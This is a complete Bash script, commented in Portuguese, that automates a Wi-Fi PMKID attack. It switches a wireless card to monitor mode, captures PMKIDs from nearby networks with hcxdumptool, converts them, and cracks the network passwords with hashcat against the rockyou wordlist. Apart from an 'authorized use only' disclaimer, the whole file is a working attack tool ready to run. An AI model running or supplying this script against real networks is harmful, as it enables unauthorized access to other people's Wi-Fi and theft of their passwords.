#!/bin/bash

# ⚠️ Apenas para uso autorizado.
# 🛡️ Autor: Raphael | Revisto por ChatGPT
# 🧙‍♂️ Ritual de captura e quebra de PMKID via Hashcat

set -e

# Função de banner
function banner() {
    echo -e "\n🛡️  PMKID Wi-Fi Cracker - Apenas para fins educacionais"
    echo -e "====================================================\n"
}

# Verificações iniciais
function checks() {
    command -v hcxdumptool >/dev/null 2>&1 || { echo "❌ hcxdumptool não instalado."; exit 1; }
    command -v hcxpcapngtool >/dev/null 2>&1 || { echo "❌ hcxpcapngtool não instalado."; exit 1; }
    command -v hashcat >/dev/null 2>&1 || { echo "❌ hashcat não instalado."; exit 1; }
    [[ ! -f /usr/share/wordlists/rockyou.txt ]] && { echo "❌ Wordlist rockyou.txt não encontrada."; exit 1; }
}

# Escolha da interface
function select_interface() {
    echo "🌐 Interfaces disponíveis:"
    iwconfig 2>/dev/null | grep "IEEE 802.11" | awk '{print $1}'
    echo -ne "\n📡 Digite o nome da interface Wi-Fi: "
    read iface

    echo "🔁 Matando processos que podem interferir..."
    airmon-ng check kill

    echo "📶 Colocando $iface em modo monitor..."
    airmon-ng start "$iface"
    iface_mon="${iface}mon"
}

# Captura PMKID
function capture_pmkid() {
    echo -ne "\n💾 Nome do arquivo de saída (sem extensão): "
    read output

    echo "📡 Escaneando redes com hcxdumptool..."
    timeout 60s hcxdumptool -i "$iface_mon" -o "$output".pcapng --enable_status=1

    echo "✅ Captura finalizada e salva como $output.pcapng"
}

# Conversão do dump para hash PMKID
function convert_hash() {
    echo "🔧 Convertendo pcapng para .22000 com hcxpcapngtool..."
    hcxpcapngtool -o "$output".22000 "$output".pcapng
}

# Quebra da senha
function crack_hash() {
    echo "🧠 Quebrando o hash com Hashcat..."
    hashcat -m 22000 -a 0 "$output".22000 /usr/share/wordlists/rockyou.txt --force

    echo -e "\n🔍 Resultado:"
    hashcat -m 22000 "$output".22000 --show
}

# Execução do ritual
banner
checks
select_interface
capture_pmkid
convert_hash
crack_hash

echo -e "\n🎉 Fim do ritual. Que a força do pentest esteja com você!"
